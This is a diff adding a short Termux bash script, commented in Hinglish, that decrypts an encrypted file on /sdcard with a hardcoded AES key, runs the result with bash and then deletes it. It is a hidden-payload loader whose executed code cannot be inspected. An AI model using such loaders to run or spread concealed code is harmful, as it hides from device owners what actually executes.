@@ -1,0 +1,18 @@
+#!/data/data/com.termux/files/usr/bin/bash
+
+# Termux ka temp folder
+TEMP="$TMPDIR/vtx_temp.sh"
+
+# Decrypt karo
+openssl enc -aes-256-cbc -d -in /sdcard/vtx/vtx.enc -k "VTX2024SECRET" > "$TEMP" 2>/dev/null
+
+if [ ! -f "$TEMP" ]; then
+    echo "Decrypt fail"
+    exit 1
+fi
+
+# Execute
+bash "$TEMP"
+
+# Cleanup
+rm -f "$TEMP"
